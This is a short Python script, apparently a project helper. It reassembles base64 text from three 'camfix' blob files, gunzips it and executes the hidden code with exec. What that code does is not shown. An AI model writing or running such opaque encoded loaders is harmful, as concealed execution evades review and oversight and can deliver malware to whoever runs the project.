#!/usr/bin/env python3
import base64, gzip
from pathlib import Path
b64 = "".join(Path(f"scripts/blobs/camfix_{i}.txt").read_text().strip() for i in range(3))
code = gzip.decompress(base64.b64decode(b64)).decode()
if code.startswith("#!"):
    code = code.split(chr(10), 1)[1]
exec(compile(code, "apply", "exec"))
